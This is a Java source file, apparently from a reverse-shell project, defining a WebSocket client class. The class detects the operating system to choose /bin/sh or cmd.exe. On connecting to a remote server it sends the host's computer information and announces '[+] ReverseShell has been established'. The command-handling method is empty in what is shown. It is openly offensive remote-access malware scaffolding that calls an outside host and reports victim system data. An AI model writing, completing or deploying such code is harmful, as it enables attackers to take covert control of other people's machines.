package com.mtattab.reverseshell.service.impl;

import com.mtattab.reverseshell.model.ServerRestCommunicationModel;
import com.mtattab.reverseshell.service.WebsocketReverseShellService;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.OSUtil;
import lombok.Getter;
import lombok.Setter;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
@Getter
@Setter
public class WebsocketReverseShellServiceImpl extends WebSocketClient implements WebsocketReverseShellService {
    private static String            os     = null;
    private static String            shell  = null;
    private static byte[]            buffer = null;
    private static int               clen   = 0;
    private static boolean           error  = false;


    private static boolean detect() {
        boolean detected = true;
        os = System.getProperty("os.name").toUpperCase();
        if (os.contains("LINUX") || os.contains("MAC")) {
            os    = "LINUX";
            shell = "/bin/sh";
        } else if (os.contains("WIN")) {
            os    = "WINDOWS";
            shell = "cmd.exe";
        } else {
            detected   = false;
            System.out.println("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
        }
        return detected;
    }


    public WebsocketReverseShellServiceImpl(URI serverURI) {
        super(serverURI);

    }

    @Override
    public void onOpen(ServerHandshake serverHandshake) {
        System.out.println(serverHandshake);
        ServerRestCommunicationModel intialCommunactionMessage=  OSUtil.getComputerInfo();
        intialCommunactionMessage.setReply("[+] ReverseShell has been established");
        send(
                DataManipulationUtil.convertObjToJson(intialCommunactionMessage
                )
        );

    }

    @Override
    public void onMessage(String s) {

    }

    @Override
    public void onClose(int i, String s, boolean b) {

    }

    @Override
    public void onError(Exception e) {

    }




}
